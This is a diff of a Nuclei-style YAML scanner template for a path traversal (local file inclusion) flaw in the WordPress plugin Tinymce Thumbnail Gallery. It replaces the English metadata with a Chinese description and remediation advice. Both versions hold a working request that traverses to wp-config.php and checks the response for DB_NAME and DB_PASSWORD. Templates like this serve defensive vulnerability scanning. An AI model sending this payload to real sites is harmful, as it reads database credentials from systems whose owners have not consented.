@@ -1,36 +1,36 @@
 id: wp-tinymce-lfi
-
 info:
-  name: Tinymce Thumbnail Gallery <=1.0.7 - Local File Inclusion
-  author: 0x_Akoko
+  name: Tinymce Thumbnail Gallery <= 1.0.7 - download-image.php LFI
+  author:
+  - l0ne1y
+  description: |-
+    WordPress Plugin Tinymce Thumbnail Gallery 存在路径遍历问题导致文件读取漏洞
+    WordPress和WordPress plugin都是WordPress基金会的产品。WordPress是一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。
+
+    WordPress Plugin Tinymce Thumbnail Gallery存在路径遍历漏洞，该漏洞允许远程攻击者通过href参数读取系统中的任意文件。
   severity: high
-  description: Tinymce Thumbnail Gallery 1.0.7 and before are vulnerable to local file inclusion via download-image.php.
-  reference:
-    - https://wpscan.com/vulnerability/4a49b023-c1c9-4cc4-a2fd-af5f911bb400
-    - http://wordpress.org/extend/plugins/tinymce-thumbnail-gallery/
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
-    cvss-score: 7.5
-    cwe-id: CWE-22
-  metadata:
-    max-request: 1
-  tags: wpscan,wordpress,wp-theme,lfi,tinymce
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：http://wordpress.org/extend/plugins/tinymce-thumbnail-gallery/
 
-http:
-  - method: GET
-    path:
-      - '{{BaseURL}}/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php'
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "DB_NAME"
-          - "DB_PASSWORD"
-        condition: and
-
-      - type: status
-        status:
-          - 200
-# digest: 4a0a004730450220236f46b5afa37bf3a6df1a423927087a421b15fbda88877e76c91dc5717c2fca022100c9f1da616e57521f06296fd94a8d6d65044a26fcc2c432eb569a06a7bbfd0ac2:922c64590222798bb761d5b6d8e72950
+    临时修复方案：
+    1、过滤\".\"，使用户在url中不能回溯上级目录。
+    2、正则匹配严格判断用户输入参数的格式，对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。
+    3、禁止系统提供目录遍历服务，如：php.ini配置open_basedir限定文件访问范围。
+    4、文件路径保存至数据库，让用户提交文件对应ID下载文件。
+    5、用户下载文件之前进行权限校验。
+requests:
+- matchers:
+  - type: word
+    condition: and
+    part: body
+    words:
+    - DB_NAME
+    - DB_PASSWORD
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php'
+  method: GET
